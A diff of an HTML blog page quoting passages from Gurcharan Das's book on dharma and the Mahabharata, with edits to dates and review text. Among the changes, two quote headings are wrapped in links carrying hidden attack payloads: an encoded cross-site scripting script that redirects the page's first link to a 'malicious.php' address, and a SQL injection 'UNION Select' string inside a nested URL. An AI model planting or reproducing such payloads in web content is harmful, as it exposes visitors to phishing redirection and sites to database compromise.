@@ -15,9 +15,9 @@
 
 <div class="single">
 <h2>The Difficulty of Being Good: On the Subtle Art of Dharma Book by Gurcharan Das </h2>
-<p class="details"> Aug 13, 2016, 12.25 PM CET | <a href="#">The Difficulty of Being Good</a> </p>
+<p class="details"> Aug 16, 2016, 4.45 PM CET | <a href="#">The Difficulty of Being Good</a> </p>
  
-<blockquote><font face="Arial" size="2" color="red"><b><i>It was captivating and thought proving piece of literature if I may say so.It tried to contextualize Indian epic “Mahabharata”, in the light of modern world. I highly recommend this book.</font></i>  </b> </blockquote>   
+<blockquote><font face="Arial" size="2" color="red"><b><i>It was captivating and thought proving piece of literature if I may say so.It tried to contextualize Indian epic “Mahabharata”, in the light of modern world. I highly recommend this book if you want to understand the subtle different between dharma and religion .</font></i>  </b> </blockquote>   
 
 <font face="Arial" size="3" color="#0000">
 <p>During my reading , I noted some paragraph and quotes which in sense tries to provide a glimpse into the central theme of the book.Like , What is dharama ? Why to be good ? and so on.
@@ -25,8 +25,10 @@ They are listed below:</p>
 
 
 <p><i>
+1a.Karl von Clausewitz, the German strategist, set out to explain the ‘inner meaning’ of war. He wrote, ‘War has no limits to violence . . . [The reason is that] each of the adversaries forces the hand of the other, and this results in continuous escalation, in which neither side is guilty even if it acts first, since every act can be called pre-emptive.’16 Once war begins, it inevitably escalates, without limit. (When Winston Churchill made the decision to fight Adolf Hitler, he did not know that the war would escalate into the fire-bombing of German cities in which thousands of civilians would die.) Great tragedy is inescapable in war.
+</i></p>
 
-
+<p><i>
 <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 1.Dharma—a complex word that means variously virtue </a>
 , duty and law, but is chiefly concerned with doing the right thing. Would I be able to recover a meaningful ideal of civic virtue from India’s foundational text? </i></p>
 
@@ -60,7 +62,9 @@ They are listed below:</p>
 </i></p>
 
 <p><i>
-8.Thomas Hobbes, the English philosopher, who argued that if men do not conquer when they can, they only reveal weakness and invite attack. ‘By a necessity of nature’ (a phrase Hobbes made popular) they conquer when they can. Hobbes translated Thucydides’s classic history of the Peloponnesian War, which is the foundation stone of ‘Realist’ thinking about international relations. In it, Athenian generals who were about to conquer Melos, a Spartan colony, said much the same to the people of Melos in 416 BC: ‘They who have the odds of power exact as much as they can, and the weak yield to such conditions as they can get . . . [men] will everywhere reign over those such as they be too strong for . . .’The Mahabharata is clearly embarrassed by Duryodhana’s matsya nyaya, ‘big-fish-eats-small-fish’ view of the world, which is the indian equivalent of the law of the jungle.
+
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
+8.Thomas Hobbes, the English philosopher,</a> who argued that if men do not conquer when they can, they only reveal weakness and invite attack. ‘By a necessity of nature’ (a phrase Hobbes made popular) they conquer when they can. Hobbes translated Thucydides’s classic history of the Peloponnesian War, which is the foundation stone of ‘Realist’ thinking about international relations. In it, Athenian generals who were about to conquer Melos, a Spartan colony, said much the same to the people of Melos in 416 BC: ‘They who have the odds of power exact as much as they can, and the weak yield to such conditions as they can get . . . [men] will everywhere reign over those such as they be too strong for . . .’The Mahabharata is clearly embarrassed by Duryodhana’s matsya nyaya, ‘big-fish-eats-small-fish’ view of the world, which is the indian equivalent of the law of the jungle.
 </i></p>
 
 
